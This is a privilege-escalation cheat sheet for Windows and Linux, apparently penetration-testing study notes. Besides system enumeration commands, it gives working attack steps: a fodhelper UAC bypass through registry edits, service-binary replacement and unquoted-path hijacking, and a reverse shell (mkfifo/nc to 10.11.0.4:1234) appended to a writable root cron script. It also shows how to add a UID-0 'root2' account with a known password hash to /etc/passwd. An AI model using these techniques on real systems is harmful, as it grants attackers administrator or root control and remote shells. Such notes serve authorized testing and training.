### Windows
##### Processes(Windows can't list processes run by privileged users)
tasklist /svc
##### Firewall
netsh advfirewall show currentprofile  
netsh advfirewall show allprofile  
netsh advfirewall firewall show rule name=all
##### Scheduled Tasks
schtasks /query /fo LIST /v
##### Enumerating Unmounted Disks
mountvol
##### Enumerating Device Drivers and Kernel Modules
1. driverquery /v /FO Table  
2. Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer
##### Enumerating Binaries That AutoElevate
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer  
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
##### Bypass UAC
```
1. check C:\Windows\System32\fodhelper.exe
2. REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
3. REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
4. REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
5. run fodhelper.exe, whoami /groups
```
##### Insecure File Permissions
```
1. Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'} # look for services with path in Program Files
2. icacls "service path"
3. replace malicious exe with service executable
4. Get-WmiObject -Class Win32_Service -Property StartMode -Filter "Name='Service Name'"
5. whoami /priv #check out shutdown privileges of user
```
##### Unquoted Service Paths
```
Service Path:
C:\Program Files\My Program\My Service\service.exe
The Service will run the executable in path like this:
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe

For example, we could name our executable Program.exe and place it in C:\, or name it My.exe and place it in C:\Program Files. However, this would require some unlikely write permissions since standard users do not have write access to these directories by default.

It is more likely that the software's main directory (C:\Program Files\My Program in our example) or subdirectory (C:\Program Files\My Program\My service) is misconfigured, allowing us to plant a malicious My.exe binary
```

### Linux
##### Kernel exploits
```
OS version:
cat /etc/issue  
cat /etc/*-release  
Kernel Version and Architecture: 
uname -a
```
##### Processes(Linux can list processes run by privileged users)
ps aux
##### Enumerating Readable/Writable Files and Directories
find / -writable(-readable,-executable) -type d(f) 2>/dev/null  
##### Enumerating Unmounted Disks
mount  
lsblk
##### Enumerating Device Drivers and Kernel Modules
1. lsmod  
2. /sbin/modinfo libata
##### Enumerating Binaries That AutoElevate
>Normally, when running an executable, it inherits the permissions of the user that runs it. However, if the SUID permissions are set, the binary will run with the permissions of the file owner. This means that if a binary has the SUID bit set and the file is owned by root, any local user will be able to execute that binary with elevated privileges
 ```
 find / -perm -u=s -type f 2>/dev/null
 ```
 ##### Cronjob to elevate privilege
 ```
 1. grep "CRON" /var/log/cron.log
Jan27 18:00:01 victim CRON[2671]:(root) CMD (cd /var/scripts/ && ./user_backups.sh)
2. ls -lah /var/scripts/user_backups.sh
-rwxrwxrw- 1 root root 52 ian 27 17:02 /var/scripts/user_backups.sh
3. echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f" >> user_backups.sh
4. nc -lnvp 1234
 ```
 ##### Insecure file permission /etc/passwd
 ```
 1. check if users have write permission
 2. openssl passwd evil:
 $1$eWmYOQrX$UHeqHr4pKVFfx1rrFK05B1
 IozRIqhlxS7jo
 3. echo "root2:$1$eWmYOQrX$UHeqHr4pKVFfx1rrFK05B1:0:0:root:/root:/bin/bash" >> /etc/passwd
 4. su root2, enter passwd as evil
 ```
